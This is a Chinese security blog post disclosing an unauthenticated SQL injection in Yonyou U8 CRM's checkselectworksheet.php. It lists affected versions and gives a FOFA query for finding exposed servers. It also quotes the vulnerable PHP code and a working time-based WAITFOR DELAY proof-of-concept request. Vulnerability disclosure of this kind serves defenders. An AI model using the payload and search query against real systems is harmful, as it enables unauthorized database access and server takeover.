---
title: "用友U8 CRM checkselectworksheet.php SQL注入漏洞"
source: https://mrxn.net/jswz/yonyon-u8crm-servicequotation-checkselectworksheet-sqli.html
asset_dir: assets/用友u8-crm-checkselectworksheet.php-sql注入漏洞
---

# 用友U8 CRM checkselectworksheet.php SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/5/17 08:29
* 1082浏览
* [0评论](#comment)
* 16分钟阅读

深入探索

企业安全咨询

VPN服务

云安全解决方案


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

用友U8 CRM[客户关系管理](#)系统是一款专业的企业级CRM软件，旨在帮助企业高效管理客户关系、提升销售业绩和提供优质的客户服务。用友 U8 CRM客户关系管理系统 `checkselectworksheet.php` 文件存在[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞，未经身份验证的攻击者通过漏洞执行任意SQL语句，调用xp\_cmdshell写入后门文件，执行任意代码，从而获取到服务器权限。

客户关系管理

# 影响版本

V18, V16.5, V16.1, V16.0, V15.1, V13

# fofa语法

> `title="用友U8CRM"`

# 漏洞分析

那直接看 `U8SOFT/turbocrm70/code/www/servicequotation/checkselectworksheet.php` 业务逻辑实现关键部分

```
<?

include_once("tglobal.lib");
    //依次把GET POST 变量变成函数内的变量
    $wsIDs = TGetRequest('wsIDs');//服务工单明细ID
    global $gblDB;
    $checkSql="select distinct(ws.pay_account_id) 
             from tc_worksheet_d wsd
               left join tc_worksheet ws on wsd.ws_id=ws.ws_id
               where ws_d_id in ($wsIDs) ";//服务工单明细只能来源于同一付款客户下   
    $rs=$gblDB->query($checkSql);
    $pay_account_id=array();
    if ($rs)
    {
       while ($rs->fetchRecord())
       {
           if (!isEmptyString($rs->getFieldValueByName("pay_account_id")))
               $pay_account_id[$rs->getFieldValueByName("pay_account_id")] = $rs->getFieldValueByName("pay_account_id");
       }
       $rs->close();
    }
    $result = array();
    //if(count($pay_account_id)!=1 || !$pay_account_id[0]){ 
    if(count($pay_account_id)>1){
       $result['success'] = false; 
       $result['message'] =TDD_GetDatadict()->getStringRes("STR_CHECKACCOUT");
    }
```

`$wsIDs = TGetRequest('wsIDs')` 获取外部输入参数并在 $checkSql 字符串中无任何过滤，无任何过滤和校验，造成[sql注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)。

# 漏洞复现

```
GET /servicequotation/checkselectworksheet.php?wsIDs=1);WAITFOR+DELAY+'0:0:5'-- HTTP/1.1
Host: u8crm.mrxn.net
Cookie: PHPSESSID=bgsesstimeout-;
```

[![用友U8 CRM checkselectworksheet.php SQL注入漏洞](images/img-001-bb6c1827db37.webp)](https://image.mrxn.net/87f2994731c84d078b3195445aea28ed.webp)

成功延时 5 秒

SQL注入检测工具

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#Java](https://mrxn.net/tag/Java)
* [#用友](https://mrxn.net/tag/%E7%94%A8%E5%8F%8B)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[用友U8 CRM checkselectworksheet.php SQL注入漏洞](https://mrxn.net/jswz/yonyon-u8crm-servicequotation-checkselectworksheet-sqli.html)  
文章链接：<https://mrxn.net/jswz/yonyon-u8crm-servicequotation-checkselectworksheet-sqli.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/yonyon-u8crm-servicequotation-checkselectworksheet-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

代码安全审计

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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